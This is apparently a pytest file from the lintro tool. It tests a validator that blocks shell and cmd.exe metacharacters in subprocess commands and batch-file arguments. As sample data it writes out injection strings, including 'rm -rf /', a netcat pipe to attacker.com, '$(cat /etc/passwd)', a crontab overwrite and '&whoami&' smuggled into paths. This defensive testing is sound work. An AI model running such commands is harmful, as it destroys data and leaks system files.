"""Tests for subprocess command injection prevention.

These tests verify that the subprocess command validation properly blocks
shell metacharacters in the command name while allowing them in arguments
(since shell=False passes arguments literally without shell interpretation),
except for arguments to a ``.cmd``/``.bat`` file, which cmd.exe parses.
"""

from __future__ import annotations

import pytest
from assertpy import assert_that

from lintro.exceptions.errors import UnsafeCommandError
from lintro.plugins.subprocess_executor import (
    UNSAFE_SHELL_CHARS,
    validate_subprocess_command,
)

# =============================================================================
# Tests for UNSAFE_SHELL_CHARS constant
# =============================================================================


def test_unsafe_chars_is_frozenset() -> None:
    """Verify UNSAFE_SHELL_CHARS is immutable (frozenset)."""
    assert_that(UNSAFE_SHELL_CHARS).is_instance_of(frozenset)


def test_unsafe_chars_contains_command_chaining_chars() -> None:
    """Verify command chaining characters are blocked."""
    chaining_chars = {";", "&", "|"}
    for char in chaining_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_redirection_chars() -> None:
    """Verify redirection characters are blocked."""
    redirection_chars = {">", "<"}
    for char in redirection_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_command_substitution_chars() -> None:
    """Verify command substitution characters are blocked."""
    substitution_chars = {"`", "$"}
    for char in substitution_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_escape_chars() -> None:
    """Verify escape and control characters are blocked."""
    escape_chars = {"\\", "\n", "\r"}
    for char in escape_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_glob_chars() -> None:
    """Verify glob pattern characters are blocked."""
    glob_chars = {"*", "?", "[", "]"}
    for char in glob_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_brace_expansion_chars() -> None:
    """Verify brace and subshell expansion characters are blocked."""
    brace_chars = {"{", "}", "(", ")"}
    for char in brace_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_other_shell_chars() -> None:
    """Verify other shell special characters are blocked."""
    other_chars = {"~", "!"}
    for char in other_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


# =============================================================================
# Tests for validate_subprocess_command function
# =============================================================================


def test_validate_subprocess_command_valid_simple_command() -> None:
    """Verify simple command passes validation."""
    validate_subprocess_command(["echo", "hello"])
    # No exception raised


def test_validate_subprocess_command_valid_command_with_flags() -> None:
    """Verify command with flags passes validation."""
    validate_subprocess_command(["ls", "-la", "--color=auto"])
    # No exception raised


def test_validate_subprocess_command_valid_command_with_path() -> None:
    """Verify command with file path passes validation."""
    validate_subprocess_command(["cat", "/path/to/file.txt"])
    # No exception raised


def test_validate_subprocess_command_empty_command_raises() -> None:
    """Verify empty command raises ValueError."""
    with pytest.raises(ValueError, match="non-empty list"):
        validate_subprocess_command([])


def test_validate_subprocess_command_none_command_raises() -> None:
    """Verify None command raises ValueError."""
    with pytest.raises(ValueError, match="non-empty list"):
        validate_subprocess_command(None)  # type: ignore[arg-type]


def test_validate_subprocess_command_string_command_raises() -> None:
    """Verify string command (not list) raises ValueError."""
    with pytest.raises(ValueError, match="non-empty list"):
        validate_subprocess_command("ls -la")  # type: ignore[arg-type]


def test_validate_subprocess_command_non_string_argument_raises() -> None:
    """Verify non-string argument raises ValueError."""
    with pytest.raises(ValueError, match="must be strings"):
        validate_subprocess_command(["ls", 123])  # type: ignore[list-item]


# =============================================================================
# Tests for unsafe characters in COMMAND NAME (should raise)
# =============================================================================


@pytest.mark.parametrize(
    ("char", "description"),
    [
        pytest.param(";", "semicolon command separator", id="semicolon"),
        pytest.param("&", "ampersand background/AND", id="ampersand"),
        pytest.param("|", "pipe", id="pipe"),
        pytest.param(">", "output redirection", id="redirect_out"),
        pytest.param("<", "input redirection", id="redirect_in"),
        pytest.param("`", "backtick command substitution", id="backtick"),
        pytest.param("$", "variable expansion", id="dollar"),
        pytest.param("\\", "escape character", id="backslash"),
        pytest.param("\n", "newline", id="newline"),
        pytest.param("\r", "carriage return", id="carriage_return"),
        pytest.param("*", "glob wildcard", id="asterisk"),
        pytest.param("?", "single char wildcard", id="question"),
        pytest.param("[", "character class start", id="bracket_open"),
        pytest.param("]", "character class end", id="bracket_close"),
        pytest.param("{", "brace expansion start", id="brace_open"),
        pytest.param("}", "brace expansion end", id="brace_close"),
        pytest.param("(", "subshell start", id="paren_open"),
        pytest.param(")", "subshell end", id="paren_close"),
        pytest.param("~", "home expansion", id="tilde"),
        pytest.param("!", "history expansion", id="exclamation"),
    ],
)
def test_validate_subprocess_command_unsafe_char_in_command_name_raises(
    char: str,
    description: str,
) -> None:
    """Verify each unsafe character in command name is blocked.

    Args:
        char: The unsafe character to test.
        description: Human-readable description of the character.
    """
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command([f"cmd{char}name", "arg"])


def test_validate_subprocess_command_injection_in_command_name() -> None:
    """Verify command injection in command name is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["ls;rm", "-la"])


# =============================================================================
# Tests for unsafe characters in ARGUMENTS (should NOT raise with shell=False)
# =============================================================================


@pytest.mark.parametrize(
    ("char", "description"),
    [
        pytest.param(";", "semicolon command separator", id="semicolon"),
        pytest.param("&", "ampersand background/AND", id="ampersand"),
        pytest.param("|", "pipe", id="pipe"),
        pytest.param(">", "output redirection", id="redirect_out"),
        pytest.param("<", "input redirection", id="redirect_in"),
        pytest.param("`", "backtick command substitution", id="backtick"),
        pytest.param("$", "variable expansion", id="dollar"),
        pytest.param("\\", "escape character", id="backslash"),
        pytest.param("*", "glob wildcard", id="asterisk"),
        pytest.param("?", "single char wildcard", id="question"),
        pytest.param("[", "character class start", id="bracket_open"),
        pytest.param("]", "character class end", id="bracket_close"),
        pytest.param("{", "brace expansion start", id="brace_open"),
        pytest.param("}", "brace expansion end", id="brace_close"),
        pytest.param("(", "subshell start", id="paren_open"),
        pytest.param(")", "subshell end", id="paren_close"),
        pytest.param("~", "home expansion", id="tilde"),
        pytest.param("!", "history expansion", id="exclamation"),
    ],
)
def test_validate_subprocess_command_special_char_in_argument_allowed(
    char: str,
    description: str,
) -> None:
    """Verify special characters in arguments are allowed with shell=False.

    Since lintro always uses shell=False, arguments are passed literally to
    the subprocess without shell interpretation. This allows legitimate use
    of special characters in file paths, glob patterns, and tool-specific
    syntax (e.g., Semgrep metavariables like $X).

    Args:
        char: The special character to test.
        description: Human-readable description of the character.
    """
    # Should NOT raise - special chars in args are safe with shell=False
    validate_subprocess_command(["echo", f"arg{char}value"])


def test_validate_subprocess_command_glob_pattern_in_argument_allowed() -> None:
    """Verify glob patterns in arguments are allowed."""
    # Common use case: passing include/exclude patterns to tools
    validate_subprocess_command(["semgrep", "--include", "*.py"])
    validate_subprocess_command(["ruff", "check", "src/**/*.py"])


def test_validate_subprocess_command_template_path_allowed() -> None:
    """Verify template paths with special chars are allowed."""
    # Common use case: Jinja2 templates, cookiecutter directories
    validate_subprocess_command(["cat", "templates/{{cookiecutter.name}}/file.py"])


def test_validate_subprocess_command_variable_syntax_allowed() -> None:
    """Verify tool-specific variable syntax is allowed."""
    # Common use case: Semgrep metavariables
    validate_subprocess_command(["semgrep", "--pattern", "$X = $Y"])


def test_validate_subprocess_command_dollar_in_filename_allowed() -> None:
    """Verify filenames with $ are allowed."""
    # Some projects have files with $ in names
    validate_subprocess_command(["cat", "test_$var.py"])


def test_validate_subprocess_command_shell_injection_args_safe_with_shell_false() -> (
    None
):
    """Verify shell injection attempts in args are safe with shell=False.

    These would be dangerous with shell=True, but are harmless with shell=False
    as the arguments are passed directly to the executable without
    shell interpretation.
    """
    # These look like injection attempts but are safe with shell=False
    validate_subprocess_command(["ls", "-la; rm -rf /"])
    validate_subprocess_command(["cat", "file | nc attacker.com 1234"])
    validate_subprocess_command(["echo", "`whoami`"])
    validate_subprocess_command(["echo", "$(cat /etc/passwd)"])
    validate_subprocess_command(["echo", "data > /etc/crontab"])


# =============================================================================
# argv0 shape: absolute paths are checked on their basename only (#2040)
# =============================================================================


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("C:/Program Files (x86)/nodejs/prettier.cmd", id="win-x86"),
        pytest.param(r"C:\Program Files (x86)\nodejs\prettier.cmd", id="win-bslash"),
        pytest.param("//server/share (x86)/bin/prettier.cmd", id="unc"),
        pytest.param("/home/dev/~tools/bin/prettier", id="posix-tilde"),
        pytest.param("/opt/build!/bin/prettier", id="posix-bang"),
        pytest.param("/opt/{a}[b]/$x*?/bin/prettier", id="posix-glob-dirs"),
    ],
)
def test_validate_subprocess_command_absolute_argv0_checks_basename_only(
    argv0: str,
) -> None:
    """An absolute argv0 with shell characters in its directories is accepted.

    Args:
        argv0: Absolute command path whose directories hold shell characters.
    """
    accepted = True
    try:
        validate_subprocess_command([argv0, "--check", "a.ts"])
    except ValueError:
        accepted = False
    assert_that(accepted).described_as(argv0).is_true()


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("prettier$(id)", id="bare-subst"),
        pytest.param("$(id)", id="bare-only-subst"),
        pytest.param("bin/prettier$(id)", id="relative-subst"),
        pytest.param("./node_modules (x86)/.bin/prettier", id="relative-dir-paren"),
        pytest.param("~/bin/prettier", id="home-relative"),
    ],
)
def test_validate_subprocess_command_non_absolute_argv0_checked_whole(
    argv0: str,
) -> None:
    """A bare or relative argv0 is still checked character by character.

    Args:
        argv0: Command name that is not an absolute path.
    """
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command([argv0])


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("C:/tools&whoami&/node_modules/.bin/prettier.cmd", id="amp"),
        pytest.param(r"C:\tools|calc\prettier.cmd", id="pipe-bslash"),
        pytest.param("C:/a%PATH%/prettier.cmd", id="percent"),
        pytest.param("C:/a^b/prettier.cmd", id="caret"),
        pytest.param('C:/a"b/prettier.cmd', id="quote"),
        pytest.param("C:/a>b/prettier.cmd", id="redirect"),
        pytest.param("C:/tools&whoami&/PRETTIER.BAT", id="upper-bat"),
        pytest.param("C:/tools&whoami&/prettier.Cmd", id="mixed-case-cmd"),
        pytest.param("C:/tools&whoami&/prettier.cmd.", id="trailing-dot"),
        pytest.param("C:/tools&whoami&/prettier.cmd. .", id="trailing-dot-space"),
        pytest.param("C:/tools&whoami&/prettier.cmd ", id="trailing-space"),
        pytest.param(r"C:\tools&whoami&\PRETTIER.BAT..", id="upper-bat-dots"),
    ],
)
def test_validate_subprocess_command_batch_argv0_checked_on_full_path(
    argv0: str,
) -> None:
    """A ``.cmd``/``.bat`` argv0 is parsed by ``cmd.exe``, directories included.

    Args:
        argv0: Absolute batch path with a cmd.exe metacharacter in a directory.
    """
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command([argv0])


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("C:/Program Files (x86)/nodejs/prettier.cmd", id="x86-cmd"),
        pytest.param(r"C:\Program Files (x86)\nodejs\TSC.BAT", id="x86-upper-bat"),
        pytest.param("/opt/a&b/bin/tool", id="posix-amp-non-batch"),
        pytest.param("C:/a&b/bin/tool.exe", id="windows-amp-exe"),
    ],
)
def test_validate_subprocess_command_batch_rule_spares_safe_paths(
    argv0: str,
) -> None:
    """``(x86)`` stays legal for batch files; ``&`` stays legal off ``cmd.exe``.

    Args:
        argv0: Absolute path that never reaches a shell parser unsafely.
    """
    accepted = True
    try:
        validate_subprocess_command([argv0])
    except ValueError:
        accepted = False
    assert_that(accepted).described_as(argv0).is_true()


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("/opt/a\nb/bin/prettier", id="posix-dir-newline"),
        pytest.param("C:/a\rb/nodejs/prettier.exe", id="windows-dir-cr"),
    ],
)
def test_validate_subprocess_command_control_chars_rejected_anywhere(
    argv0: str,
) -> None:
    """Newline and carriage return are rejected even in an absolute directory.

    Args:
        argv0: Absolute path with a control character in a directory.
    """
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command([argv0])


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("/usr/local/bin/prettier$(id)", id="posix"),
        pytest.param("C:/Program Files (x86)/nodejs/prettier;calc.cmd", id="win"),
    ],
)
def test_validate_subprocess_command_absolute_argv0_unsafe_basename_rejected(
    argv0: str,
) -> None:
    """The basename of an absolute argv0 keeps the full character check.

    Args:
        argv0: Absolute command path with a shell character in its basename.
    """
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command([argv0])


# =============================================================================
# Arguments passed to a batch argv0 are parsed by cmd.exe (#3486)
# =============================================================================


@pytest.mark.parametrize(
    ("argv0", "arg", "char"),
    [
        pytest.param("C:/safe/prettier.cmd", "a&whoami&b", "'&'", id="amp"),
        pytest.param("C:/safe/prettier.cmd", "a|calc", "'|'", id="pipe"),
        pytest.param("C:/safe/prettier.cmd", "a>out.txt", "'>'", id="redirect-out"),
        pytest.param("C:/safe/prettier.cmd", "a<in.txt", "'<'", id="redirect-in"),
        pytest.param("C:/safe/prettier.cmd", "a^&b", "'&' '^'", id="caret"),
        pytest.param("C:/safe/prettier.cmd", "%PATH%", "'%'", id="percent-var"),
        pytest.param("C:/safe/prettier.cmd", 'a" & calc & "', "'\"' '&'", id="quote"),
        pytest.param("C:/safe/prettier.cmd", "a\rb", "'\\r'", id="cr"),
        pytest.param("C:/safe/prettier.cmd", "a\nb", "'\\n'", id="lf"),
        pytest.param(r"C:\safe\PRETTIER.CMD.", "a&b", "'&'", id="upper-cmd-dot"),
        pytest.param("C:/safe/prettier.bat ", "a&b", "'&'", id="bat-space"),
        pytest.param("C:/safe/prettier.Bat. .", "a&b", "'&'", id="bat-dot-space"),
        pytest.param("prettier.cmd", "a&b", "'&'", id="bare-batch-name"),
        pytest.param(
            "C:/Program Files (x86)/nodejs/prettier.cmd",
            "C:/repo/a&b.ts",
            "'&'",
            id="x86-argv0-amp-path",
        ),
    ],
)
def test_validate_subprocess_command_batch_argument_with_metachar_rejected(
    argv0: str,
    arg: str,
    char: str,
) -> None:
    """A batch tool never receives an argument cmd.exe would interpret.

    Args:
        argv0: A ``.cmd``/``.bat`` command, in any suffix spelling Windows runs.
        arg: Argument holding a cmd.exe metacharacter.
        char: The offending characters as the error message lists them.
    """
    with pytest.raises(UnsafeCommandError) as excinfo:
        validate_subprocess_command([argv0, "--check", arg])
    message = str(excinfo.value)
    assert_that(message).contains(f"argument 2 ({arg!r})")
    assert_that(message).contains(f"cmd.exe would interpret {char} in it")
    assert_that(excinfo.value).is_instance_of(ValueError)


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("prettier", id="bare"),
        pytest.param("/usr/local/bin/prettier", id="posix-abs"),
        pytest.param("C:/safe/prettier.exe", id="windows-exe"),
        pytest.param("C:/safe/prettier.cmd.exe", id="cmd-then-exe"),
        pytest.param("C:/safe/prettier.cmdx", id="cmdx"),
    ],
)
def test_validate_subprocess_command_metachar_argument_allowed_off_batch(
    argv0: str,
) -> None:
    """The same arguments stay legal when argv0 never reaches cmd.exe.

    Args:
        argv0: A command Windows runs directly, without cmd.exe.
    """
    args = ["a&whoami&b", "%PATH%", 'say "hi"', "a^b", "x|y", "<in>"]
    accepted = True
    try:
        validate_subprocess_command([argv0, *args])
    except ValueError:
        accepted = False
    assert_that(accepted).described_as(argv0).is_true()


@pytest.mark.parametrize(
    "arg",
    [
        pytest.param("C:/Program Files (x86)/repo/src/a.ts", id="x86-forward"),
        pytest.param(r"C:\Program Files (x86)\repo\src\a.ts", id="x86-backslash"),
        pytest.param("--config=C:/Users/dev/My Project (2)/.prettierrc", id="flag"),
        pytest.param("src/{a,b}/*.ts", id="glob"),
        pytest.param("README!.md", id="bang"),
        pytest.param("--check", id="plain-flag"),
    ],
)
def test_validate_subprocess_command_ordinary_batch_arguments_allowed(
    arg: str,
) -> None:
    """Ordinary paths, ``(x86)`` included, still reach a batch tool.

    Args:
        arg: An argument with no cmd.exe metacharacter.
    """
    accepted = True
    try:
        validate_subprocess_command(
            ["C:/Program Files (x86)/nodejs/prettier.cmd", "--check", arg],
        )
    except ValueError:
        accepted = False
    assert_that(accepted).described_as(arg).is_true()
